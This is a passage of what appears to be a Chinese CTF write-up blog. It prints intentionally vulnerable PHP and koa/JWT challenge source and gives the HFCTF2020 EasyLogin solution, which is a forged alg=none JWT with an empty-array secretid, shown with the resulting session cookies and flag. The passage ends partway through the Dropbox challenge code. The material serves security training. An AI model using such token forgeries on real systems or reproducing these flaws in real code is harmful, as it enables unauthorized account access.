</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;h1&gt;Register&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;div&gt;&lt;?=addslashes($_GET[&#39;msg&#39;]);?&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;form action=&#34;/?action=reg&#34; method=&#34;POST&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			Username : &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			Password : &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;a href=&#34;/?action=login&#34;&gt;Go to Login&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;input type=&#34;submit&#34; value=&#34;Register&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">case &#39;change&#39;:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	if (isset($_POST[&#39;info&#39;])) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		$info = addslashes($_POST[&#39;info&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		if (mysql_query(&#34;update users set info=&#39;{$info}&#39; where username=&#39;{$_SESSION[&#39;username&#39;]}&#39;;&#34;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			header(&#34;Location: /?action=index&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		} else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			header(&#34;Location: /?action=change&amp;msg=修改失败&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		exit;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">case &#39;logout&#39;:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	session_destroy();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	header(&#34;Location: /?action=login&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	exit;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">case &#39;index&#39;:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">default:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	$info = query(&#34;select info from users where username=&#39;{$_SESSION[&#39;username&#39;]}&#39;;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;h1&gt;Info&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;div&gt;&lt;?=addslashes($info[&#39;info&#39;]);?&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;hr&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;div&gt;&lt;?=addslashes($_GET[&#39;msg&#39;]);?&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;form action=&#34;/?action=change&#34; method=&#34;POST&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			Info : &lt;input type=&#34;text&#34; name=&#34;info&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">			&lt;input type=&#34;submit&#34; value=&#34;Change&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">		&lt;a href=&#34;/?action=logout&#34;&gt;Logout&lt;/a&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">echo &#34;&lt;!-- October nb!!!!! --&gt;&#34;;
</span></span></span></code></pre></div><hr>
<h2 id="hfctf2020easylogin">[HFCTF2020]EasyLogin<a hidden class="anchor" aria-hidden="true" href="#hfctf2020easylogin">#</a></h2>
<p>查看app.js发现一段注释：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  或许该用 koa-static 来处理静态文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *  路径该怎么配置？不管了先填个根目录XD
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span></code></pre></div><p>koa是基于nodejs的web框架，有固定的目录结构，/controllers/api.js：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">crypto</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;crypto&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">jwt</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;jsonwebtoken&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">APIError</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;../rest&#39;</span>).<span style="color:#a6e22e">APIError</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;POST /api/register&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">next</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;admin&#39;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">APIError</span>(<span style="color:#e6db74">&#39;register error&#39;</span>, <span style="color:#e6db74">&#39;wrong username&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">secrets</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100000</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">secrets</span> <span style="color:#f92672">=</span> [];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">18</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secretid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">secrets</span>.<span style="color:#a6e22e">length</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">secrets</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">secret</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">sign</span>({<span style="color:#a6e22e">secretid</span>, <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>}, <span style="color:#a6e22e">secret</span>, {<span style="color:#a6e22e">algorithm</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;HS256&#39;</span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">rest</span>({
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">token</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">token</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;POST /api/login&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">next</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> {<span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">password</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">APIError</span>(<span style="color:#e6db74">&#39;login error&#39;</span>, <span style="color:#e6db74">&#39;username or password is necessary&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">header</span>.<span style="color:#a6e22e">authorization</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">authorization</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">authorization</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(<span style="color:#a6e22e">token</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;base64&#39;</span>).<span style="color:#a6e22e">toString</span>()).<span style="color:#a6e22e">secretid</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">sid</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">sid</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">undefined</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">sid</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(<span style="color:#a6e22e">sid</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">secrets</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">sid</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">APIError</span>(<span style="color:#e6db74">&#39;login error&#39;</span>, <span style="color:#e6db74">&#39;no such secret id&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">secret</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">global</span>.<span style="color:#a6e22e">secrets</span>[<span style="color:#a6e22e">sid</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">jwt</span>.<span style="color:#a6e22e">verify</span>(<span style="color:#a6e22e">token</span>, <span style="color:#a6e22e">secret</span>, {<span style="color:#a6e22e">algorithm</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;HS256&#39;</span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">status</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">password</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">status</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">username</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">rest</span>({
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">status</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;GET /api/flag&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">next</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;admin&#39;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">APIError</span>(<span style="color:#e6db74">&#39;permission error&#39;</span>, <span style="color:#e6db74">&#39;permission denied&#39;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>).<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">rest</span>({
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">flag</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;GET /api/logout&#39;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">ctx</span>, <span style="color:#a6e22e">next</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">rest</span>({
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>        })
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>可以将alg置为none，但是有对sid的限制，不能是undefined 或 null且必须满足0 ≤ sid &lt; global.secrets.length，空数组绕过：</p>
<pre tabindex="0"><code>username=admin&amp;password=12345&amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1IiwiaWF0IjoxNzU0MjAzOTA3fQ.

Set-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTc1NDI5NjI2NDI1NywiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Mon, 04 Aug 2025 08:31:04 GMT; httponly
Set-Cookie: sses:aok.sig=w4pfPZYLt2rCMLMnOCIp_BePdnU; path=/; 
</code></pre><p>带着相应的cookie访问/api/flag，拿到flag：flag{a027f724-d12f-4dd7-b6ba-04132dfc38bb}</p>
<hr>
<h2 id="ciscn2019-华北赛区-day1-web1dropbox">[CISCN2019 华北赛区 Day1 Web1]Dropbox<a hidden class="anchor" aria-hidden="true" href="#ciscn2019-华北赛区-day1-web1dropbox">#</a></h2>
<p>download.php存在任意文件下载，index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;login&#39;</span>])) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;meta charset=&#34;utf-8&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1, shrink-to-fit=no&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;title&gt;网盘管理&lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;link href=&#34;static/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;link href=&#34;static/css/panel.css&#34; rel=&#34;stylesheet&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script src=&#34;static/js/jquery.min.js&#34;&gt;&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script src=&#34;static/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script src=&#34;static/js/toast.js&#34;&gt;&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script src=&#34;static/js/panel.js&#34;&gt;&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;body&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;nav aria-label=&#34;breadcrumb&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;ol class=&#34;breadcrumb&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;li class=&#34;breadcrumb-item active&#34;&gt;管理面板&lt;/li&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;li class=&#34;breadcrumb-item active&#34;&gt;&lt;label for=&#34;fileInput&#34; class=&#34;fileLabel&#34;&gt;上传文件&lt;/label&gt;&lt;/li&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;li class=&#34;active ml-auto&#34;&gt;&lt;a href=&#34;#&#34;&gt;你好 &lt;?php echo $_SESSION[&#39;username&#39;]?&gt;&lt;/a&gt;&lt;/li&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/ol&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/nav&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;input type=&#34;file&#34; id=&#34;fileInput&#34; class=&#34;hidden&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;div class=&#34;top&#34; id=&#34;toast-container&#34;&gt;&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">include &#34;class.php&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$a = new FileList($_SESSION[&#39;sandbox&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$a-&gt;Name();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$a-&gt;Size();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">?&gt;
</span></span></span></code></pre></div><p>class.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>$dbaddr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>;
</span></span><span style="display:flex;"><span>$dbuser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
</span></span><span style="display:flex;"><span>$dbpass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;root&#34;</span>;
</span></span><span style="display:flex;"><span>$dbname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dropbox&#34;</span>;
</span></span><span style="display:flex;"><span>$db <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($dbaddr, $dbuser, $dbpass, $dbname);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $db;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">global</span> $db;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> $db;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">user_exist</span>($username) {
</span></span><span style="display:flex;"><span>        $stmt <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&#34;</span>);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;s&#34;</span>, $username);
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
</span></span><span style="display:flex;"><span>        $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">store_result</span>();
</span></span><span style="display:flex;"><span>        $count <span style="color:#f92672">=</span> $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num_rows</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($count <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">add_user</span>($username, $password) {
